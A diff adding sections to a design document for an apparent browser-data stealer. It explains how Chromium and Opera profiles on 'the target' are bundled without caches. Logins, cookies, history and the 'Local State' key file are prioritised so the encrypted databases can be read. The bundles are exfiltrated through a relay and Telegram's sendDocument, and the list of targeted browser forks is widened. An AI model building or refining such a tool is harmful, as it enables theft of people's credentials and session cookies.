@@ -596,5 +596,69 @@ exists. A remembered path is only used if the file is still there, so a launcher
 has been moved or deleted does not sit in the field as a validation failure the
 operator has to diagnose.
 
+## The profile bundle is the folder minus the caches, not the folder
+
+The first plan was "copy the whole app folder." Measured before building it, and the
+measurement changed the plan:
+
+| profile | whole | caches | kept |
+|---|---|---|---|
+| Chrome `Profile 1` | 12.7 MB | 7.8 MB | 3.6 MB |
+| Edge `Default` | 2,214 MB | 2,022 MB | 177 MB |
+| Brave `Default` | 3,204 MB | 2,977 MB | 216 MB |
+
+So the multi-gigabyte folder is multi-gigabyte cache. `_SKIP_DIRS` drops exactly
+those: `Cache`, `Code Cache`, `GPUCache`, `Service Worker`, the shader caches, the
+crx caches, `File System`, `blob_storage`, `Crashpad`, the metrics and model stores.
+What is left is a normal-sized upload.
+
+`_BULK_DIRS` is the second tier — `IndexedDB`, `Local Extension Settings`,
+`Extensions`, `Local Storage`, `Web Applications`. Real data, and most of the
+remaining bytes, but not the part anyone reaches for first. It is copied only after
+everything else and only until the budget is gone, so a tight budget costs bulk and
+never `Login Data`, `Cookies`, `History`, `Web Data` or `Preferences`.
+
+`_MAX_BUNDLE_BYTES` is 192 MB per profile across both passes. That is not a disk limit
+— it is a transport limit. `relay.transmit` reads the whole archive into memory and
+then builds the multipart body as a second full copy, so a 192 MB bundle costs about
+400 MB of RAM on the target before the first byte leaves. `_MAX_UPLOAD` in `relay.py`
+caps at 2 GB and refuses above it; Telegram's `sendDocument` caps at 50 MB on the
+public Bot API, which no folder grab of any size will ever satisfy.
+
+Both lists are sorted before copying, so two runs over the same profile produce the
+same bundle and a budget that runs out takes the tail of an alphabetical list rather
+than whatever the filesystem returned first.
+
+Bundling is unconditional whenever the `browsers` source is on. Adding a
+`SourceConfig` flag would mean a new key in `core/schema.py`, a new row on the sources
+page and a new entry in `config.example.json` — a schema change to express a
+preference, when the thing being controlled is a directory filter.
+
+`run_profile` counts the bundle as one item, not as its file count. The contract is
+"items written", and five thousand files copied out of one profile is one collected
+artifact; counting files would drown every other collector's number in the log.
+
+`Local State` lives beside the profile rather than inside it, and the copied databases
+are ciphertext without it, so it is lifted to the profile's target directory
+explicitly.
+
+## The root list is the vendors, not one vendor
+
+Eighteen Chromium roots and six Opera roots. The point is not the count; it is that
+`Thorium` and `Supermium` are Chromium forks with the same layout and neither was in
+the list, and both are installed on the development machine. A root that does not
+exist costs one `is_dir()` call, so the cheap side of the trade is to name the ones
+that exist in the world rather than the ones that exist in one person's memory.
+
+Chrome Beta, Dev and Canary; Edge Beta, Dev and Canary; Brave Beta and Nightly;
+Vivaldi Snapshot. Opera ships GX under two folder names depending on the build —
+`Opera GX Stable` and `Opera GX` — so both are listed under the one label and the
+profile slug keeps their output directories apart.
+
+`System Profile` is still collected. It has the marker files because Chromium builds it
+that way, and the recognition rule in this module is the files a directory contains,
+not its name. Excluding it would mean adding a name rule that contradicts the one
+stated at the top of the file, to save a few megabytes.
+
 
 
